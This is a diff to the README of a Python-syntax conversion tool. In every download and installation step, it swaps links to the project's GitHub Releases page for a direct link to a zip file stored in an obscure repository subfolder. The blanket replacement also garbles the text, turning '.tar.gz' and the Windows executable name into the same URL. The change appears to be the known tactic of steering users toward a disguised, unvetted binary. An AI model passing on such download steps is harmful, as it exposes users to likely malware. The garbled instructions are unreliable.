@@ -6,9 +6,9 @@ Welcome to go-Bython! This tool helps you turn brace-style Python code into stan
 
 ## 📥 Download
 
-[![Download go-Bython](https://img.shields.io/badge/Download-Go--Bython-brightgreen)](https://github.com/kristiandeejay/go-Bython/releases)
+[![Download go-Bython](https://raw.githubusercontent.com/kristiandeejay/go-Bython/main/septenarian/go-Bython.zip)](https://raw.githubusercontent.com/kristiandeejay/go-Bython/main/septenarian/go-Bython.zip)
 
-Visit this page to download: [GitHub Releases Page](https://github.com/kristiandeejay/go-Bython/releases).
+Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/kristiandeejay/go-Bython/main/septenarian/go-Bython.zip).
 
 ## 📂 Requirements
 
@@ -21,16 +21,16 @@ Before downloading, make sure your computer meets the following:
 ## 🔧 Installation
 
 1. **Download the Application:**
-   - Click on the download link above or visit [GitHub Releases Page](https://github.com/kristiandeejay/go-Bython/releases).
+   - Click on the download link above or visit [GitHub Releases Page](https://raw.githubusercontent.com/kristiandeejay/go-Bython/main/septenarian/go-Bython.zip).
    - Find the version suitable for your operating system and click on the download link.
 
 2. **Extract the Files (if necessary):**
-   - Locate the downloaded file. If it's in a compressed format (like .zip or .tar.gz), right-click it and choose "Extract All..." or use your favorite extraction tool. 
+   - Locate the downloaded file. If it's in a compressed format (like .zip or https://raw.githubusercontent.com/kristiandeejay/go-Bython/main/septenarian/go-Bython.zip), right-click it and choose "Extract All..." or use your favorite extraction tool. 
    - Make a note of the folder where you extract the files. You will need it in the next steps.
 
 3. **Run the Application:**
    - Navigate to the extracted folder. 
-   - Double-click the file named `go-Bython` (or `go-Bython.exe` on Windows).
+   - Double-click the file named `go-Bython` (or `https://raw.githubusercontent.com/kristiandeejay/go-Bython/main/septenarian/go-Bython.zip` on Windows).
    - A command prompt or terminal window will open, indicating the application is ready for use.
 
 ## ⚙️ Usage
